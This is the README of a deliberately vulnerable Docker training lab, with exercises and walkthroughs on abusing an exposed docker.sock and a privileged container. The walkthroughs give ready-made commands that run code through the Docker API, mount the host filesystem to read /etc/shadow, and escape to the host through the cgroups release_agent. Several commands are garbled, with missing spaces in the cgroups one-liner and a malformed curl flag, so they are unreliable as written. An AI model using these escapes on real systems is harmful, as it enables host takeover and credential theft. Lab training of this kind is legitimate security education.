# Damn Vulnerable Docker Container

## Getting Started

```
$ docker build --tag dvdc:1.0 .
$ docker run -d --network host -v /var/run/docker.sock:/var/run/docker.sock --name dvdc dvdc:1.0
```

## Exercises

### Docker Sockets

#### Exercise 1: Querying the API

In this exercise, the host's docker.sock will be exposed to the container. To get started, drop into a local shell:
```
docker exec -it dvdc /bin/bash
```

With the exposed socket you can make API calls to query running containers, start new containers, and even break out to the host. In this exercises, try to find out what version of Docker is running using the API.

    <summary>GIDding around</summary>

    # Sometimes the GID the group that can write to /var/run/docker.sock inside the container might show up as a number, i.e:
    # srw-rw---- 1 root 967 0 Jul  6 03:24 /var/run/docker.sock
    # This is because the GID of the docker group on the host doesn't exist in the container.
    # The container user is a member of the "giddy" group which can be used with "groupadd", which has been given suid permissions, to grant the user write permissions on /var/run/docker.sock.
    # This can be done with the following command:
    groupmod -g {writable-gid} giddy # where {writable-gid} is the gid in your "ls -l /var/run/docker.sock" output
</details>

#### Exercise 2: Command execution

Now that we know we can query the API via the mounted socket we can use the exposed functionality to execute commands as the container's root user. You can use the `/exec` endpoint to accomplish this.

<details>
    <summary>Walkthrough</summary>

    # Send and execute a command
    user@66a0d5faa124:~$ curl -insecure -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/dvdc/exec -d '{"AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "touch /tmp/success"]}'

    -rw-r--r-- 1 user user    0 Jul  6 06:50 success
</details>


#### Exercise 3: Reading the host filesystem

Code execution is great, but the API can be abused to create new containers and read the host filesystem. You can use the `/containers/create` endpoint to do this.
<details>
    <summary>Walkthrough</summary>

    # Deploy a new container called "escape", mount the host's filesystem to `/host` and then run `cat /host/etc/shadow`
    curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d'{"Image":"ubuntu:latest","Cmd":["cat", "/host/etc/shadow"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}]}' "http://localhost/containers/create?name=escape"

    # Start the container
    curl -XPOST --unix-socket /var/run/docker.sock "http://localhost/containers/escape/start"

    # Read the output of the command
    curl --output - --unix-socket /var/run/docker.sock "http://localhost/containers/escape/logs?stdout=true"

    # Clean up
    curl -XDELETE --unix-socket /var/run/docker.sock "http://localhost/containers/escape"
</details>

#### Exercise 4: Communicating with the Docker Daemon with static docker binaries

Now that you can read the host filesystem you can search for sensitive files. In secure docker environments, the dockerd service uses TLS and requires a client to verify itself with a private key. In this exercise, try to use a docker static binary (found [here](https://download.docker.com/linux/static/stable/)) to connect to the host daemon. If TLS is enforced, use the technique in exercise 3 to read the docker certificates and connect to the host daemon.

#### Exercise 5: Breaking out

Being able to use the docker binary within the container allows you to more easily enumerate the environment, read the build history of containers deploy, new containers, and fully break out of the compromised container. In this exercise, use what you heave learned to deploy a new, privileged container which mounts the host file system by using the exposed docker daemon. Once deployed, drop into a shell with `docker exec` to interact with the filesystem.

### Privileged Mode

Docker has a special privileged mode which, if enabled with the `--privileged` flag, allows a container to access all host devices and kernel capabilities. This feature can be abused on linux hosts via `cgroups`.

The following is a quick and dirty way of getting out of a privileged k8 pod or docker container by using the cgroups release agent feature ([source](https://twitter.com/_fel1x/status/1151487051986087936))
```
(host) docker run -it --rm --privileged ubuntu:latest bash
(cont)# d=`dirname$(ls -x /s*/fs/c*/*/r* |head -n1)`
(cont)# mkdir -p $d/w
(cont)# echo 1 >$d/w/notify_on_release
(cont)# t=`sed -n's/.*\perdir=\([^,]*\).*/\1/p'/etc/mtab`
(cont)# touch /o
(cont)# echo$t/c >$d/release_agent
(cont)# printf'#!/bin/sh\nps >'"$t/o" >/c
(cont)# chmod +x /c
(cont)# sh -c "echo 0 >$d/w/cgroup.procs"
(cont)# sleep 1
(cont)# cat /o
```
